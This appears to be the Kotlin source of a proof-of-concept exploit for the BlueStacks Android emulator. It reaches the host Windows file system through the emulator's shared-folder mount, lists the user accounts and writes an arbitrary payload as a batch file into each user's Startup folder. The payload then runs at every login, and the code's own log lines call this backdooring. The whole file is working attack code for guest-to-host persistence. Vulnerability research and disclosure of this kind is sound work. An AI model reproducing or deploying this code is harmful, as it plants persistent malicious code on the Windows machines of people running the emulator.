package mmiszczyk.bluestackshack

import android.util.Log
import java.io.File

class Exploit {
    private val TAG = "EXPLOIT"

    private val C_DRIVE = File("/mnt/windows/BstSharedFolder/")
    private val USERS = File(C_DRIVE, "Users/")

    fun installBackdoor(payload: String){
        enumerateUsers().forEach{addPayloadToAutorun(it, payload)}
    }

    fun enumerateUsers(): List<String> {
        return USERS.list()?.filter { it !in listOf("Public", "Default", "All Users", "desktop.ini") } ?: listOf("")
    }

    fun addPayloadToAutorun(user: String, payload: String){
        val d = File(File(USERS, user), "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
        if(!d.exists() || !d.isDirectory){
            Log.e(TAG, "Cannot access ${d.absolutePath}; skipping")
            return
        }
        try{
            File(d, "payload.bat").writeText(payload)
        } catch (e: Exception){
            Log.e(TAG, "Error backdooring user $user")
            Log.e(TAG, e.toString())
            return
        }
        Log.d(TAG, "Successfully backdoored user $user")

    }
}
